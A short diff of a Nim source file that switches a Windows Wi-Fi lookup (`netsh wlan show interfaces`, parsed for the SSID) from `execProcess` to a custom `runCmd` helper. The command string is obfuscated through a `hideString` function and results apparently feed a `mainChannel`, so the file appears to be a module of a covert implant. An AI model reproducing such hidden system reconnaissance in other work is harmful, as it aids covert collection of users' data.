@@ -1,14 +1,14 @@
 from strutils import split
 from strutils import contains
 
-from osproc import execProcess
+import ../functions/runCmd
 
 from ../channels import mainChannel
 
 import ../functions/hideString
 
 proc getConnectedWifi(): void =
-  let netshOutout1: string = execProcess d e"netsh wlan show interfaces"
+  let netshOutout1: string = runCmd d e"netsh wlan show interfaces"
 
   for line in netshOutout1.split "\n":
     if line.contains("SSID") and not line.contains("BSSID"):
